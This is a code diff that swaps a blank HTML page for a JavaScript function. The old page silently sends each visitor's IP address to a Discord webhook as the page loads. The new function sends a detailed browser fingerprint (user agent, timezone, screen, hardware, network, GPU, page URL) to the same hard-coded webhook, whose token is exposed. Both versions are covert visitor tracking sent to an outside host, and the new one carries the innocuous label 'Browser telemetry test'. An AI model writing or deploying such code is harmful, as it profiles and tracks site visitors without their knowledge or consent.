@@ -1,29 +1,92 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title> </title>
-</head>
+const DISCORD_WEBHOOK =
+    "https://discordapp.com/api/webhooks/1404081818210140261/eqgIhBzxtjWIrnvZgvL6I2lJk5huWk2GOmBoeCZxydMdcEE_pqziaOkZd1MQDyOrY1HC";
 
-<body>
-  <h1> </h1>
 
-  <script>
-  (async () => {
-    const ip = await fetch("https://api.ipify.org?format=json")
-      .then(r => r.json())
-      .then(data => data.ip);
+async function sendToDiscord(data) {
 
-    await fetch("https://discordapp.com/api/webhooks/1404081818210140261/eqgIhBzxtjWIrnvZgvL6I2lJk5huWk2GOmBoeCZxydMdcEE_pqziaOkZd1MQDyOrY1HC", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        content: `My IP: ${ip}`
-      })
+    const embed = {
+        title: "🌐 New Website Visit",
+        color: 3447003,
+
+        fields: [
+            {
+                name: "🖥️ Browser",
+                value:
+                    `\`\`\`${data.userAgent.substring(0, 1000)}\`\`\``
+            },
+
+            {
+                name: "📍 Location / Timezone",
+                value:
+                    `${data.timezone}\n${data.localTime}`
+            },
+
+            {
+                name: "🖥️ Screen",
+                value:
+                    `${data.screen.width}x${data.screen.height}\n` +
+                    `Pixel ratio: ${data.screen.pixelRatio}`
+            },
+
+            {
+                name: "⚙️ Hardware",
+                value:
+                    `CPU cores: ${data.hardware.cpuCores}\n` +
+                    `RAM estimate: ${data.hardware.memory || "unknown"}GB\n` +
+                    `Touch points: ${data.hardware.touchPoints}`
+            },
+
+            {
+                name: "🌐 Network",
+                value:
+                    data.network
+                    ?
+                    `Type: ${data.network.effectiveType}\n` +
+                    `Speed: ${data.network.downlink} Mbps\n` +
+                    `RTT: ${data.network.rtt}ms`
+                    :
+                    "Unavailable"
+            },
+
+            {
+                name: "🎮 GPU",
+                value:
+                    data.webgl?.renderer
+                    ?
+                    `\`${data.webgl.renderer.substring(0, 500)}\``
+                    :
+                    "Unavailable"
+            },
+
+            {
+                name: "🔗 Page",
+                value:
+                    data.page.url.substring(0, 1000)
+            }
+        ],
+
+        footer: {
+            text:
+                "Browser telemetry test"
+        },
+
+        timestamp:
+            new Date().toISOString()
+    };
+
+
+    await fetch(DISCORD_WEBHOOK, {
+
+        method: "POST",
+
+        headers: {
+            "Content-Type": "application/json"
+        },
+
+        body: JSON.stringify({
+            embeds: [embed]
+        })
+
     });
-  })();
-  </script>
 
-</body>
-</html>
+}
